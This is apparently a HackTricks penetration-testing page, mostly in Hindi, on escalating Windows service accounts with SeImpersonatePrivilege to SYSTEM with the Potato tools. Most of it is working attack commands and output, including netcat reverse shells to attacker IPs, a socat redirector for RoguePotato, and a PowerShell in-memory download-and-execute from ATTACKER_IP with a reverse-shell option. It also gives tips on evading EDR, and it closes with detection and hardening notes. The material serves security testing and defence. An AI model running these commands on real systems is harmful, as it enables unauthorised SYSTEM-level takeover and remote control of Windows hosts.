# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य समस्याएँ

नीचे दी गई सभी techniques एक impersonation-capable privileged service का दुरुपयोग करने पर निर्भर करती हैं, और यह context उन privileges में से किसी एक को होल्ड करता है:

- SeImpersonatePrivilege (सबसे आम) या SeAssignPrimaryTokenPrivilege
- High integrity आवश्यक नहीं है अगर token में पहले से SeImpersonatePrivilege मौजूद है (आम तौर पर कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए ऐसा होता है)

प्रिविलेज जल्दी से चेक करें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशनल नोट्स:

- PrintSpoofer को Print Spooler सेवा चालू और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य होना चाहिए। कड़े वातावरण में जहाँ Spooler को PrintNightmare के बाद निष्क्रिय किया गया है, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato के लिए TCP/135 पर उपलब्ध OXID resolver चाहिए। यदि egress ब्लॉक है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता होती थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि कोई एक pipe ब्लॉक है, तो वैकल्पिक pipes (lsarpc, efsrpc, samr, lsass, netlogon) आज़माएँ।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर किसी अज्ञात/असमर्थित RPC authentication service को सूचित करता है; किसी अलग pipe/transport को आज़माएँ या सुनिश्चित करें कि target service चल रही है।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप वर्तमान कंसोल में एक इंटरैक्टिव प्रोसेस शुरू करने के लिए -i का उपयोग कर सकते हैं, या एक-लाइनेर चलाने के लिए -c का उपयोग कर सकते हैं।
- Spooler service की आवश्यकता होती है। यदि यह अक्षम है, तो यह विफल हो जाएगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 blocked है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: यदि एक pipe विफल हो जाए या EDR इसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।  

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato दो वेरिएंट प्रदान करता है जो service DCOM objects को लक्षित करते हैं जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर होते हैं। दिए गए binaries को बनाएँ या उपयोग करें और अपना command चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है जैसे .NET reflection के माध्यम से in-memory execution और PowerShell reverse shell helper।
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## डिटेक्शन और हार्डनिंग नोट्स

- उन processes को मॉनिटर करें जो named pipes बना रहे हैं और तुरंत token-duplication APIs को कॉल कर रहे हैं और फिर CreateProcessAsUser/CreateProcessWithTokenW को कॉल करते हैं। Sysmon उपयोगी telemetry प्रदान कर सकता है: Event ID 1 (process creation), 17/18 (named pipe created/connected), और ऐसे command lines जो SYSTEM के रूप में child processes spawn करते हैं।
- Spooler हार्डनिंग: उन servers पर जहाँ इसकी आवश्यकता नहीं है, Print Spooler service को डिसेबल करने से spoolss के माध्यम से PrintSpoofer-style स्थानीय दुरुपयोग रोका जा सकता है।
- Service account हार्डनिंग: custom services को SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege असाइन करने को न्यूनतम रखें। सेवाओं को आवश्यक न्यूनतम privileges वाले virtual accounts के तहत चलाना और संभव हो तो उन्हें service SID और write-restricted tokens से अलग करना विचार करें।
- Network कंट्रोल्स: outbound TCP/135 ब्लॉक करना या RPC endpoint mapper ट्रैफ़िक को सीमित करना RoguePotato को रोक सकता है जब तक कि कोई internal redirector उपलब्ध न हो।
- EDR/AV: ये सभी tools व्यापक रूप से signatured हैं। source से recompile करना, symbols/strings का नाम बदलना, या in-memory execution का उपयोग detection को कम कर सकता है पर मजबूत behavioral detections को हरा नहीं पाएगा।

## संदर्भ

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
